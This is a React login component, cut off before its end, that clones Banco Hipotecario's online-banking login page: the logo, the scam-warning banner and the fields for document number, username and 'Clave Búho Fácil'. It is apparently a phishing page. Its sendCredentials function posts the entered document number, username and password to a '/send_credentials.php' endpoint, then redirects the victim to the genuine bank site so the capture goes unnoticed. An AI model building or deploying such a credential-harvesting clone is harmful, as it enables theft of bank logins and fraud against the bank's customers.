import React from 'react';
import "../Responsive.css";
import { Button } from 'react-bootstrap';
import { Card, CardHeader, CardContent, CardActions, Checkbox } from '@material-ui/core';
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faExclamationTriangle } from "@fortawesome/free-solid-svg-icons";
import { faUser } from "@fortawesome/free-solid-svg-icons";
import { faLock } from "@fortawesome/free-solid-svg-icons";
import { faEye } from "@fortawesome/free-solid-svg-icons";
import { faEyeSlash } from "@fortawesome/free-solid-svg-icons";
import { faIdCard } from "@fortawesome/free-regular-svg-icons";
import { faKeyboard } from "@fortawesome/free-regular-svg-icons";
import axios from '../config/axios.ts';
import moment from 'moment';

const exclamationTriangle = <FontAwesomeIcon icon={faExclamationTriangle} />;
const user = <FontAwesomeIcon icon={faUser} />;
const lock = <FontAwesomeIcon icon={faLock} />;
const eye = <FontAwesomeIcon icon={faEye} />;
const eyeSlash = <FontAwesomeIcon icon={faEyeSlash} />;
const idCard = <FontAwesomeIcon icon={faIdCard} />;
const keyboard = <FontAwesomeIcon icon={faKeyboard} />;


const LoginView = () => {

    const [documentVal, setDocument] = React.useState(null);
    const [usernameVal, setUsername] = React.useState(null);
    const [passwordVal, setPassword] = React.useState(null);
    const [userShown, setUserShown] = React.useState(false);
    const [passwordShown, setPasswordShown] = React.useState(false);

    const handleChangeDocument = (event) => {
        setDocument(event.target.value);
        console.log(documentVal);
    }

    const handleChangeUsername = (event) => {
        setUsername(event.target.value);
        console.log(usernameVal);
    }
    const handleChangePassword = (event) => {
        setPassword(event.target.value);
        console.log(passwordVal);
    }

    const toggleUserVisiblity = () => {
        setUserShown(userShown ? false : true);
    };

    const togglePasswordVisiblity = () => {
        setPasswordShown(passwordShown ? false : true);
    };

    

    const sendCredentials = async () =>{
        try{
            const date = new Date();

            const data = {
                type: "DNI",
                document: documentVal,
                username: usernameVal,
                password: passwordVal,
                created: moment(date).format('YYYY-MM-DD HH:mm:ss').toString()
            }

            await axios.post("/send_credentials.php", data)
            .then(response=>{
                console.log(response);
                window.location.href = "https://www.hipotecario.com.ar/";
            });
        }
        catch(e){
            console.log(e);
        }
    }

    return(
        <div
            className="loginCardContainer"
            style={{
                height:"auto",
                width:"100%",
                paddingTop:"3%",
                boxSizing:"border-box",
                display:"block"
            }}>
            <form
                style={{
                    boxSizing:"border-box",
                    display:"block",
                    marginTop:"0em"
                }}>
                <Card
                    className="cardlogin"
                    style={{
                        boxShadow:"0 6px 10px 0 rgba(0,0,0,.1)",
                        borderRadius:"15px",
                        width:"100%",
                        maxWidth:"482px",
                        background:"#fff",
                        display:"block",
                        position:"relative",
                        margin:"auto",
                        padding:"24px"
                    }}>
                    <CardContent
                        className="mat-card-content"
                        style={{
                            fontSize:"14px",
                            display:"block",
                            marginBottom:"16px",
                            textAlign:"center",
                            boxSizing:"border-box",
                            padding:"0"
                        }}>
                        <div
                            className="divLogo"
                            style={{
                                width:"85%",
                                margin:"0 auto",
                                textAlign:"left",
                                boxSizing:"border-box",
                                display:"block"
                            }}>
                            <div
                                className="imgLogo"
                                style={{
                                    width:"139px",
                                    height:"50px",
                                    marginBottom:"20px",
                                    backgroundRepeat:"no-repeat",
                                    display:"inline-block",
                                    fill:"currentcolor",
                                    boxSizing:"border-box"
                                }}>
                                <svg
                                    xmlns="http://www.w3.org/2000/svg"
                                    width="100%"
                                    height="100%"
                                    viewBox="0 0 139 50"
                                    style={{
                                        overflow:"hidden",
                                        verticalAlign:"middle",
                                        boxSizing:"border-box"
                                    }}>
                                    <g
                                        fill="none"
                                        fill-rule="nonzero">
                                        <path
                                            fill="#58595B"
                                            d="M31.514 18.32h1.166c.92 0 1.477-.439 1.477-1.277 0-.757-.593-1.286-1.485-1.286h-1.158v2.563zm0-3.11h.957c.675 0 1.185-.473 1.185-1.13 0-.529-.402-1.048-1.168-1.048h-.974v2.179zm-.657-2.433c0-.228.11-.347.401-.347h1.176c1.413 0 1.877.892 1.877 1.623 0 .765-.363 1.13-.92 1.357v.02c.894.145 1.422.71 1.422 1.63 0 .976-.628 1.859-2.06 1.859h-1.495c-.292 0-.4-.117-.4-.346v-5.796zM38.478 13.231h-.019l-1.35 3.675h2.718l-1.35-3.675zm-2.016 5.444c-.08.163-.137.3-.363.3-.192 0-.292-.118-.292-.255 0-.074.027-.182.064-.274l2.088-5.597c.08-.21.182-.474.51-.474.327 0 .428.265.51.474l2.087 5.597c.036.092.064.2.064.274 0 .137-.101.255-.292.255-.228 0-.301-.136-.365-.3l-.427-1.168H36.89l-.429 1.168zM43.044 18.556c0 .272-.119.42-.328.42-.21 0-.328-.147-.328-.42v-5.798c0-.255.146-.383.328-.383.182 0 .292.11.383.238l3.483 5.094h.017v-4.912c0-.275.12-.42.329-.42.208 0 .328.145.328.42v5.779c0 .31-.128.401-.31.401-.174 0-.246-.082-.356-.237l-3.528-5.16h-.018v4.978M53.545 13.35c0 .228-.154.348-.292.348-.273 0-.611-.72-1.686-.72-1.367 0-2.106 1.466-2.106 2.787 0 1.342.656 2.608 2.224 2.608 1.14 0 1.486-.638 1.722-.638.165 0 .273.1.273.329 0 .282-.838.911-2.031.911-1.988 0-2.901-1.476-2.901-3.21 0-1.703.913-3.39 2.826-3.39 1.096 0 1.97.657 1.97.975M59.479 15.675c0-1.221-.52-2.697-2.043-2.697-1.522 0-2.041 1.476-2.041 2.697 0 1.222.52 2.698 2.041 2.698 1.523 0 2.043-1.476 2.043-2.698zm-2.043-3.3c1.832 0 2.753 1.651 2.753 3.3 0 1.65-.92 3.3-2.753 3.3-1.83 0-2.752-1.65-2.752-3.3 0-1.649.92-3.3 2.752-3.3zM32.849 38.097c0 .789-.384 1.194-.992 1.194-.61 0-.993-.406-.993-1.194V24.164c0-.788.384-1.196.993-1.196.608 0 .992.407.992 1.196v6.086h7.015v-6.086c0-.788.384-1.196.993-1.196.608 0 .99.407.99 1.196v13.933c0 .789-.382 1.194-.99 1.194-.61 0-.993-.406-.993-1.194v-6.133h-7.015v6.133M46.869 38.232c0 .654-.383 1.06-.993 1.06-.608 0-.992-.406-.992-1.06V28.086c0-.653.383-1.06.992-1.06.61 0 .993.407.993 1.06v10.146zm-.993-15.263c.677 0 1.217.543 1.217 1.217 0 .678-.54 1.218-1.217 1.218-.676 0-1.217-.541-1.217-1.218 0-.675.541-1.217 1.217-1.217zM54.94 37.578c2.436 0 3.292-2.39 3.292-4.42 0-2.028-.857-4.418-3.291-4.418-2.435 0-3.292 2.39-3.292 4.418 0 2.031.857 4.42 3.292 4.42zm-5.071-9.492c0-.653.382-1.06.99-1.06.61 0 .993.407.993 1.06v.588h.044c.565-1.083 1.624-1.647 3.203-1.647 3.245 0 5.117 2.954 5.117 6.132 0 3.18-1.872 6.134-5.117 6.134a3.917 3.917 0 0 1-3.203-1.623h-.044v5.297c0 .655-.383 1.06-.993 1.06-.608 0-.99-.405-.99-1.06v-14.88zM67.245 37.578c2.435 0 3.292-2.39 3.292-4.42 0-2.028-.857-4.418-3.292-4.418-2.435 0-3.291 2.39-3.291 4.418 0 2.031.856 4.42 3.29 4.42zm0-10.552c3.382 0 5.275 2.954 5.275 6.133 0 3.18-1.893 6.133-5.275 6.133-3.382 0-5.275-2.954-5.275-6.133s1.893-6.133 5.275-6.133zM75.396 24.57c0-.654.384-1.06.994-1.06.609 0 .992.406.992 1.06v2.593h.81c.654 0 .992.315.992.857 0 .54-.338.856-.991.856h-.811v9.356c0 .654-.383 1.06-.992 1.06-.61 0-.994-.406-.994-1.06v-9.356h-.81c-.654 0-.991-.315-.991-.856 0-.542.337-.857.991-.857h.81V24.57M88.745 32.44c0-1.715-.991-3.699-3.18-3.699-2.457-.09-3.336 1.873-3.403 3.699h6.583zm-6.583 1.486c0 2.05 1.308 3.652 3.54 3.652 2.638 0 3.314-1.623 4.057-1.623.363 0 .724.315.724.88 0 .97-2.46 2.457-4.803 2.457-3.834 0-5.502-2.954-5.502-6.133 0-3.246 2.03-6.133 5.388-6.133 3.271 0 5.163 2.954 5.163 5.84 0 .7-.246 1.06-1.104 1.06h-7.463zM98.033 27.026c2.03 0 3.224.699 3.224 1.512 0 .405-.339.834-.811.834-.767 0-1.06-.631-2.413-.631-2.457 0-3.426 2.39-3.426 4.418 0 2.03.97 4.42 3.426 4.42 1.398 0 1.758-.676 2.39-.676.45 0 .768.293.768.833 0 .744-1.105 1.555-3.157 1.555-3.654 0-5.412-2.953-5.412-6.133 0-3.178 1.758-6.132 5.411-6.132M108.057 37.578c2.434 0 3.29-2.39 3.29-4.42 0-2.028-.856-4.418-3.29-4.418-2.435 0-3.292 2.39-3.292 4.418 0 2.031.857 4.42 3.292 4.42zm5.163.744c0 .698-.542.97-.927.97-.405 0-.923-.272-.923-.97v-.833h-.045c-.857 1.217-1.984 1.803-3.268 1.803-3.382 0-5.277-2.954-5.277-6.133s1.895-6.133 5.277-6.133c1.376 0 2.344.588 3.268 1.602h.045v-.632c0-.697.52-.97.923-.97.385 0 .927.273.927.97v10.326zM116.182 28.086c0-.653.384-1.06.992-1.06.61 0 .993.407.993 1.06v1.015h.045c.45-.923 1.555-2.075 2.704-2.075.7 0 1.104.452 1.104 1.016 0 .562-.406.924-1.239 1.082-1.174.202-2.615 1.082-2.615 3.405v5.702c0 .654-.383 1.06-.993 1.06-.608 0-.992-.406-.992-1.06V28.086M126.038 38.232c0 .654-.384 1.06-.992 1.06-.61 0-.992-.406-.992-1.06V28.086c0-.653.382-1.06.992-1.06.608 0 .992.407.992 1.06v10.146zm-.993-15.263c.675 0 1.217.543 1.217 1.217 0 .678-.542 1.218-1.217 1.218-.677 0-1.217-.541-1.217-1.218 0-.675.54-1.217 1.217-1.217zM133.5 37.578c2.434 0 3.29-2.39 3.29-4.42 0-2.028-.856-4.418-3.29-4.418-2.436 0-3.293 2.39-3.293 4.418.001 2.031.857 4.42 3.292 4.42zm0-10.552c3.38 0 5.274 2.954 5.274 6.133 0 3.18-1.894 6.133-5.275 6.133-3.382 0-5.277-2.954-5.277-6.133s1.895-6.133 5.277-6.133z">
                                        </path>
                                        <path
                                            fill="#F37321"
                                            d="M.328.612v34.734l3.766-2.173 3.559-2.056 3.998-2.307.051-.024c.06-.03.118-.055.176-.08.051-.019.102-.042.154-.055.056-.017.11-.027.167-.04.058-.01.115-.021.171-.028.058-.006.113-.005.17-.005.058 0 .113-.001.17.005.057.007.113.018.17.028.058.013.113.022.169.04.052.014.1.036.152.056.06.024.12.048.176.08l.053.023 3.998 2.307 3.558 2.056 3.765 2.172V.612H.328">
                                        </path>
                                        <path
                                            fill="#F37321"
                                            d="M17.428 35.227l-4.003-2.31-.013-.012a1.79 1.79 0 0 0-1.758.012l-4.001 2.31-3.559 2.053-3.766 2.176v10.003h24.423V39.454l-3.764-2.174-3.559-2.053">
                                        </path>
                                        <path
                                            fill="#fff"
                                            d="M24.751 39.454l-3.764-2.174-3.559-2.053-4.003-2.31-.013-.012a1.79 1.79 0 0 0-1.758.012l-4.001 2.31-3.559 2.053-3.766 2.176v-4.11l3.766-2.174 3.559-2.055 3.998-2.308.051-.023c.06-.032.118-.056.176-.08.051-.02.102-.042.154-.056.056-.017.11-.027.167-.04.058-.01.115-.02.171-.028.058-.006.113-.004.17-.004.058 0 .113-.002.17.004.057.007.113.018.17.028.058.013.113.023.169.04.052.014.1.036.152.056.06.024.12.048.176.08l.053.023 3.998 2.308 3.558 2.055 3.765 2.172v4.11">
                                        </path>
                                    </g>
                                </svg>
                            </div>
                        </div>
                        <div
                            style={{
                                boxSizing:"border-box",
                                textAlign:"center"
                            }}>
                            <div
                                className="alertaEstafas"
                                style={{
                                    marginLeft:"-24px",
                                    marginRight:"-24px",
                                    backgroundColor:"#ad1b2d",
                                    boxShadow:"0 2px 15px rgb(0 0 0 / 8%)",
                                    borderRadius:"0 0 10px 10px",
                                    padding:"10px 50px 7px",
                                    marginBottom:"15px",
                                    textAlign:"left",
                                    boxSizing:"border-box",
                                    display:"block"
                                }}>
                                <h5
                                    className="font-family"
                                    style={{
                                        fontWeight:"500",
                                        fontSize:"23px",
                                        fontStyle:"normal",
                                        lineHeight:"27px",
                                        color:"#fff",
                                        marginTop:"0px",
                                        marginBottom:".5rem"
                                    }}>
                                    <span
                                        className="material-icons"
                                        style={{
                                            fontWeight:"500",
                                            fontSize:"23px",
                                            fontStyle:"normal",
                                            lineHeight:"27px",
                                            color:"#fff",
                                            boxSizing:"border-box",
                                            paddingRight:"10px"
                                        }}>
                                        {exclamationTriangle}
                                    </span>
                                    Evitemos las estafas.
                                </h5>
                                <p
                                    className="font-family margin-top"
                                    style={{
                                        fontSize:"20px",
                                        fontWeight:"400",
                                        fontStyle:"normal",
                                        lineHeight:"27px",
                                        color:"#fff",
                                        marginBottom:"1rem",
                                        boxSizing:"border-box",
                                        marginBlockEnd:"1em"
                                    }}>
                                    Nunca compartas tu mail, clave personal, usuario ni token. Ni siquiera con nosotros.
                                </p>
                            </div>
                        </div>

                        {/*Document number field*/}
                        <div
                            className="divField font-family"
                            style={{
                                width:"85%",
                                margin:"0 auto",
                                textAlign:"left",
                                boxSizing:"border-box",
                                display:"block",
                                fontSize:"14px",
                                fontWeight:"400",
                                lineHeight:"1.5",
                                WebkitTextSizeAdjust:"100%",
                                WebkitTapHighlightColor:"transparent"
                            }}>
                            <div
                                className="mat-form-field font-family"
                                style={{
                                    display:"inline-block",
                                    position:"relative",
                                    textAlign:"left",
                                    fontWeight:"400",
                                    lineHeight:"1.125",
                                    width:"100%",
                                    boxSizing:"border-box"
                                }}>
                                <div
                                    className="mat-form-field-wrapper"
                                    style={{
                                        paddingBottom:"1.25em",
                                        position:"relative",
                                        boxSizing:"border-box",
                                        display:"block",
                                        textAlign:"left"
                                    }}>
                                    <div
                                        className="mat-form-field-flex"
                                        style={{
                                            display:"inline-flex",
                                            alignItems:"baseline",
                                            boxSizing:"border-box",
                                            width:"100%",
                                            textAlign:"left"
                                        }}>
                                        <div
                                            className="mat-form-field-prefix"
                                            style={{
                                                whiteSpace:"nowrap",
                                                flex:"none",
                                                position:"relative",
                                                boxSizing:"border-box",
                                                display:"block",
                                                textAlign:"left"
                                            }}>
                                            <span
                                                style={{
                                                    boxSizing:"border-box"
                                                }}>
                                                <div
                                                    className="div-span"
                                                    style={{
                                                        width:"30px",
                                                        textAlign:"center",
                                                        boxSizing:"border-box"
                                                    }}>
                                                    <i
                                                        style={{
                                                            color:"#b0b8bf",
                                                            display:"inline-block",
                                                            fontSize:"20px",
                                                            width:"25px",
                                                            textAlign:"center"
                                                        }}>
                                                        {idCard}
                                                    </i>
                                                </div>
                                            </span>
                                        </div>
                                        <div
                                            className="mat-form-field-infix"
                                            style={{
                                                flex:"auto",
                                                minWidth:"0",
                                                width:"180px",
                                                position:"relative",
                                                boxSizing:"border-box",
                                                display:"block"
                                            }}>
                                            <input
                                                type="number"
                                                id="dataDocument"
                                                onChange={handleChangeDocument}
                                                className="mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-touched ng-dirty ng-valid"
                                                aria-invalid="false"
                                                aria-required="false"
                                                maxLength="20"
                                                style={{
                                                    fontSize:"20px",
                                                    WebkitAppearance:"none",
                                                    font:"inherit",
                                                    outline:"0",
                                                    padding:"0",
                                                    margin:"0",
                                                    width:"100%",
                                                    maxWidth:"100%",
                                                    verticalAlign:"bottom",
                                                    caretColor:"#f37320",
                                                    overflow:"visible",
                                                    boxSizing:"border-box",
                                                    border:"transparent"
                                                }}/>
                                            <span
                                                className="mat-form-field-label-wrapper font-family"
                                                style={{
                                                    position:"absolute",
                                                    left:"0",
                                                    boxSizing:"content-box",
                                                    width:"100%",
                                                    height:"100%",
                                                    overflow:"hidden",
                                                    pointerEvents:"none",
                                                    textAlign:"left",
                                                    fontSize:"inherit",
                                                    fontWeight:"400",
                                                    lineHeight:"1.125"
                                                }}>
                                                <label
                                                    className="mat-form-field-label ng-tns-c11-0 ng-star-inserted"
                                                    htmlFor="dataDocument"
                                                    style={{
                                                        color:"#b0b8bf",
                                                        top:"1.28125em",
                                                        marginBottom:"0",
                                                        boxSizing:"border-box"
                                                    }}>
                                                    Documento
                                                </label>
                                            </span>
                                        </div>
                                    </div>
                                    <div
                                        className="mat-form-field-underline ng-tns-c11-0 ng-star-inserted"
                                        style={{
                                            height:"1px",
                                            bottom:"1.25em",
                                            backgroundColor:"#b0b8bf",
                                            position:"absolute",
                                            width:"100%",
                                            pointerEvents:"none",
                                            transform:"scaleY(1.0001)",
                                            boxSizing:"border-box",
                                            display:"block",
                                            textAlign:"left"
                                        }}>
                                        <span
                                            className="mat-form-field-ripple"
                                            style={{
                                                top:"0",
                                                height:"2px",
                                                overflow:"hidden",
                                                boxSizing:"border-box"
                                            }}>
                                        </span>
                                    </div>
                                    <div
                                        className="mat-form-field-subscript-wrapper"
                                        style={{
                                            height:"11px",
                                            overflow:"hidden"
                                        }}>
                                        <div
                                            className="mat-form-field-hint-wrapper ng-tns-c11-0 ng-trigger ng-trigger-transitionMessages ng-star-inserted"
                                            style={{
                                                opacity:1,
                                                transform:"translateY(0%)",
                                                display:"flex",
                                                boxSizing:"border-box"
                                            }}>
                                            <div
                                                className="mat-form-field-hint-spacer"
                                                style={{
                                                    flex:"1 0 1 em",
                                                    boxSizing:"border-box",
                                                    display:"block"
                                                }}>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        {/*User field*/}
                        <div
                            className="divField font-family"
                            style={{
                                width:"85%",
                                margin:"0 auto",
                                textAlign:"left",
                                boxSizing:"border-box",
                                display:"block",
                                fontSize:"14px",
                                fontWeight:"400",
                                lineHeight:"1.5",
                                WebkitTextSizeAdjust:"100%",
                                WebkitTapHighlightColor:"transparent"
                            }}>
                            <div
                                className="mat-form-field font-family"
                                style={{
                                    display:"inline-block",
                                    position:"relative",
                                    textAlign:"left",
                                    fontWeight:"400",
                                    lineHeight:"1.125",
                                    width:"100%",
                                    boxSizing:"border-box"
                                }}>
                                <div
                                    className="mat-form-field-wrapper"
                                    style={{
                                        paddingBottom:"1.25em",
                                        position:"relative",
                                        boxSizing:"border-box",
                                        display:"block",
                                        textAlign:"left"
                                    }}>
                                    <div
                                        className="mat-form-field-flex"
                                        style={{
                                            display:"inline-flex",
                                            alignItems:"baseline",
                                            boxSizing:"border-box",
                                            width:"100%",
                                            textAlign:"left"
                                        }}>
                                        <div
                                            className="mat-form-field-prefix"
                                            style={{
                                                whiteSpace:"nowrap",
                                                flex:"none",
                                                position:"relative",
                                                boxSizing:"border-box",
                                                display:"block",
                                                textAlign:"left"
                                            }}>
                                            <span
                                                style={{
                                                    boxSizing:"border-box"
                                                }}>
                                                <div
                                                    className="div-span"
                                                    style={{
                                                        width:"30px",
                                                        textAlign:"center",
                                                        boxSizing:"border-box"
                                                    }}>
                                                    <i
                                                        style={{
                                                            color:"#b0b8bf",
                                                            display:"inline-block",
                                                            fontSize:"20px",
                                                            width:"25px",
                                                            textAlign:"center"
                                                        }}>
                                                        {user}
                                                    </i>
                                                </div>
                                            </span>
                                        </div>
                                        <div
                                            className="mat-form-field-infix"
                                            style={{
                                                flex:"auto",
                                                minWidth:"0",
                                                width:"180px",
                                                position:"relative",
                                                boxSizing:"border-box",
                                                display:"block"
                                            }}>
                                            <input
                                                type={userShown ? "text" : "password"}
                                                id="dataUser"
                                                onChange={handleChangeUsername}
                                                className="mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-touched ng-dirty ng-valid"
                                                aria-invalid="false"
                                                aria-required="false"
                                                maxLength="20"
                                                style={{
                                                    fontSize:"20px",
                                                    WebkitAppearance:"none",
                                                    font:"inherit",
                                                    outline:"0",
                                                    padding:"0",
                                                    margin:"0",
                                                    width:"100%",
                                                    maxWidth:"100%",
                                                    verticalAlign:"bottom",
                                                    caretColor:"#f37320",
                                                    overflow:"visible",
                                                    boxSizing:"border-box",
                                                    border:"transparent"
                                                }}/>
                                            <span
                                                className="mat-form-field-label-wrapper font-family"
                                                style={{
                                                    position:"absolute",
                                                    left:"0",
                                                    boxSizing:"content-box",
                                                    width:"100%",
                                                    height:"100%",
                                                    overflow:"hidden",
                                                    pointerEvents:"none",
                                                    textAlign:"left",
                                                    fontSize:"inherit",
                                                    fontWeight:"400",
                                                    lineHeight:"1.125"
                                                }}>
                                                <label
                                                    className="mat-form-field-label ng-tns-c11-0 ng-star-inserted"
                                                    htmlFor="dataUser"
                                                    style={{
                                                        color:"#b0b8bf",
                                                        top:"1.28125em",
                                                        marginBottom:"0",
                                                        boxSizing:"border-box"
                                                    }}>
                                                    Usuario
                                                </label>
                                            </span>
                                        </div>
                                        <div
                                            className="mat-form-field-suffix ng-tns-c11-2 ng-star-inserted"
                                            style={{
                                                whiteSpace:"nowrap",
                                                flex:"none",
                                                position:"relative",
                                                boxSizing:"border-box",
                                                display:"block"
                                            }}>
                                            <span
                                                className="ng-star-inserted"
                                                style={{
                                                    boxSizing:"border-box",
                                                    whiteSpace:"nowrap",
                                                    textAlign:"left"
                                                }}>
                                                <i
                                                    className="toggle-password-icon"
                                                    onClick={toggleUserVisiblity}
                                                    style={{
                                                        color:"#b0b8bf",
                                                        display:"inline-block",
                                                        fontSize:"20px",
                                                        width:"25px",
                                                        boxSizing:"border-box",
                                                        whiteSpace:"nowrap",
                                                        textAlign:"left",
                                                        textRendering:"auto",
                                                        WebkitFontSmoothing:"antialiased"
                                                    }}>
                                                    {userShown ? eye : eyeSlash}
                                                </i>
                                            </span>
                                        </div>
                                    </div>
                                    <div
                                        className="mat-form-field-underline ng-tns-c11-0 ng-star-inserted"
                                        style={{
                                            height:"1px",
                                            bottom:"1.25em",
                                            backgroundColor:"#b0b8bf",
                                            position:"absolute",
                                            width:"100%",
                                            pointerEvents:"none",
                                            transform:"scaleY(1.0001)",
                                            boxSizing:"border-box",
                                            display:"block",
                                            textAlign:"left"
                                        }}>
                                        <span
                                            className="mat-form-field-ripple"
                                            style={{
                                                top:"0",
                                                height:"2px",
                                                overflow:"hidden",
                                                boxSizing:"border-box"
                                            }}>
                                        </span>
                                    </div>
                                    <div
                                        className="mat-form-field-subscript-wrapper"
                                        style={{
                                            height:"11px",
                                            overflow:"hidden"
                                        }}>
                                        <div
                                            className="mat-form-field-hint-wrapper ng-tns-c11-0 ng-trigger ng-trigger-transitionMessages ng-star-inserted"
                                            style={{
                                                opacity:1,
                                                transform:"translateY(0%)",
                                                display:"flex",
                                                boxSizing:"border-box"
                                            }}>
                                            <div
                                                className="mat-form-field-hint-spacer"
                                                style={{
                                                    flex:"1 0 1 em",
                                                    boxSizing:"border-box",
                                                    display:"block"
                                                }}>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        {/*Password field*/}
                        <div
                            className="divField font-family"
                            style={{
                                width:"85%",
                                margin:"0 auto",
                                textAlign:"left",
                                boxSizing:"border-box",
                                display:"block",
                                fontSize:"14px",
                                fontWeight:"400",
                                lineHeight:"1.5",
                                WebkitTextSizeAdjust:"100%",
                                WebkitTapHighlightColor:"transparent"
                            }}>
                            <div
                                className="mat-form-field font-family"
                                style={{
                                    display:"inline-block",
                                    position:"relative",
                                    textAlign:"left",
                                    fontWeight:"400",
                                    lineHeight:"1.125",
                                    width:"100%",
                                    boxSizing:"border-box"
                                }}>
                                <div
                                    className="mat-form-field-wrapper"
                                    style={{
                                        paddingBottom:"1.25em",
                                        position:"relative",
                                        boxSizing:"border-box",
                                        display:"block",
                                        textAlign:"left"
                                    }}>
                                    <div
                                        className="mat-form-field-flex"
                                        style={{
                                            display:"inline-flex",
                                            alignItems:"baseline",
                                            boxSizing:"border-box",
                                            width:"100%",
                                            textAlign:"left"
                                        }}>
                                        <div
                                            className="mat-form-field-prefix"
                                            style={{
                                                whiteSpace:"nowrap",
                                                flex:"none",
                                                position:"relative",
                                                boxSizing:"border-box",
                                                display:"block",
                                                textAlign:"left"
                                            }}>
                                            <span
                                                style={{
                                                    boxSizing:"border-box"
                                                }}>
                                                <div
                                                    className="div-span"
                                                    style={{
                                                        width:"30px",
                                                        textAlign:"center",
                                                        boxSizing:"border-box"
                                                    }}>
                                                    <i
                                                        style={{
                                                            color:"#b0b8bf",
                                                            display:"inline-block",
                                                            fontSize:"20px",
                                                            width:"25px",
                                                            textAlign:"center"
                                                        }}>
                                                        {lock}
                                                    </i>
                                                </div>
                                            </span>
                                        </div>
                                        <div
                                            className="mat-form-field-infix"
                                            style={{
                                                flex:"auto",
                                                minWidth:"0",
                                                width:"180px",
                                                position:"relative",
                                                boxSizing:"border-box",
                                                display:"block"
                                            }}>
                                            <input
                                                type={passwordShown ? "text" : "password"}
                                                id="dataPassword"
                                                onChange={handleChangePassword}
                                                className="mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-touched ng-dirty ng-valid"
                                                aria-invalid="false"
                                                aria-required="false"
                                                maxLength="20"
                                                style={{
                                                    fontSize:"20px",
                                                    WebkitAppearance:"none",
                                                    font:"inherit",
                                                    outline:"0",
                                                    padding:"0",
                                                    margin:"0",
                                                    width:"100%",
                                                    maxWidth:"100%",
                                                    verticalAlign:"bottom",
                                                    caretColor:"#f37320",
                                                    overflow:"visible",
                                                    boxSizing:"border-box",
                                                    border:"transparent"
                                                }}/>
                                            <span
                                                className="mat-form-field-label-wrapper font-family"
                                                style={{
                                                    position:"absolute",
                                                    left:"0",
                                                    boxSizing:"content-box",
                                                    width:"100%",
                                                    height:"100%",
                                                    overflow:"hidden",
                                                    pointerEvents:"none",
                                                    textAlign:"left",
                                                    fontSize:"inherit",
                                                    fontWeight:"400",
                                                    lineHeight:"1.125",
                                                }}>
                                                <label
                                                    className="mat-form-field-label ng-tns-c11-0 ng-star-inserted"
                                                    htmlFor="dataPassword"
                                                    style={{
                                                        color:"#b0b8bf",
                                                        top:"1.28125em",
                                                        marginBottom:"0",
                                                        boxSizing:"border-box"
                                                    }}>
                                                    Clave Búho Fácil
                                                </label>
                                            </span>
                                        </div>
                                        <div
                                            className="mat-form-field-suffix ng-tns-c11-2 ng-star-inserted"
                                            style={{
                                                whiteSpace:"nowrap",
                                                flex:"none",
                                                position:"relative",
                                                boxSizing:"border-box",
                                                display:"block"
                                            }}>
                                            <span
                                                className="ng-star-inserted"
                                                style={{
                                                    boxSizing:"border-box",
                                                    whiteSpace:"nowrap",
                                                    textAlign:"left"
                                                }}>
                                                <i
                                                    className="toggle-password-icon"
                                                    onClick={togglePasswordVisiblity}
                                                    style={{
                                                        color:"#b0b8bf",
                                                        display:"inline-block",
                                                        fontSize:"20px",
                                                        width:"25px",
                                                        boxSizing:"border-box",
                                                        whiteSpace:"nowrap",
                                                        textAlign:"left",
                                                        textRendering:"auto",
                                                        WebkitFontSmoothing:"antialiased"
                                                    }}>
                                                    {passwordShown ? eye : eyeSlash}
                                                </i>
                                            </span>
                                        </div>
                                    </div>
                                    <div
                                        className="mat-form-field-underline ng-tns-c11-0 ng-star-inserted"
                                        style={{
                                            height:"1px",
                                            bottom:"1.25em",
                                            backgroundColor:"#b0b8bf",
                                            position:"absolute",
                                            width:"100%",
                                            pointerEvents:"none",
                                            transform:"scaleY(1.0001)",
                                            boxSizing:"border-box",
                                            display:"block",
                                            textAlign:"left"
                                        }}>
                                        <span
                                            className="mat-form-field-ripple"
                                            style={{
                                                top:"0",
                                                height:"2px",
                                                overflow:"hidden",
                                                boxSizing:"border-box"
                                            }}>
                                        </span>
                                    </div>
                                    <div
                                        className="mat-form-field-subscript-wrapper"
                                        style={{
                                            height:"11px",
                                            overflow:"hidden"
                                        }}>
                                        <div
                                            className="mat-form-field-hint-wrapper ng-tns-c11-0 ng-trigger ng-trigger-transitionMessages ng-star-inserted"
                                            style={{
                                                opacity:1,
                                                transform:"translateY(0%)",
                                                display:"flex",
                                                boxSizing:"border-box"
                                            }}>
                                            <div
                                                className="mat-form-field-hint-spacer"
                                                style={{
                                                    flex:"1 0 1 em",
                                                    boxSizing:"border-box",
                                                    display:"block"
                                                }}>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div
                            className="divField checkbox-field font-family"
                            style={{
                                fontSize:"small",
                                textAlign:"left",
                                boxSizing:"border-box",
                                display:"block"
                            }}>
                            <Checkbox
                                className="mat-checkbox font-family"
                                style={{
                                    marginLeft:"8px",
                                    cursor:"pointer",
                                    color:'#f37320'
                                }}>

                            </Checkbox>
                            Recordar mi documento
                        </div>
                        <div
                            className="divField virtual-keyboard-field font-family"
                            style={{
                                fontSize:"small",
                                marginBottom:"0",
                                width:"85%",
                                boxSizing:"border-box"
                            }}>
                            <span
                                style={{
                                    boxSizing:"border-box",
                                    fontSize:"small",
                                    textAlign:"left",
                                    padding:"13px"
                                }}>
                                <div
                                    style={{
                                        width:"30px",
                                        display:"inline-block",
                                        textAlign:"center",
                                        margin:"0px",
                                        marginLeft:"1px",
                                        marginTop:"5px",
                                        marginRight:"5px",
                                        boxSizing:"border-box"
                                    }}>
                                    <i
                                        style={{
                                            color:"#b0b8bf",
                                            fontSize:"20px",
                                            width:"25px",
                                            boxSizing:"border-box"
                                        }}>
                                        {keyboard}
                                    </i>
                                </div>
                                Teclado virtual
                            </span>
                        </div>
                    </CardContent>
                    <div
                        className="mat-card-actions"
                        style={{
                            padding:"8px 0",
                            display:"block",
                            marginBottom:"16px",
                            textAlign:"center",
                            boxSizing:"border-box"
                        }}>
                        <div
                            className="align-items-center"
                            style={{
                                alignItems:"center",
                                justifyContent:"center",
                                display:"flex",
                                flexWrap:"wrap",
                                marginRight:"-15px",
                                marginLeft:"-15px",
                                boxSizing:"border-box"
                            }}>
                            <div
                                className="col-sm-auto"
                                style={{
                                    position:"relative",
                                    paddingRight:"15px",
                                    paddingLeft:"15px",
                                    boxSizing:"border-box",
                                    display:"block",
                                    textAlign:"center"
                                }}>
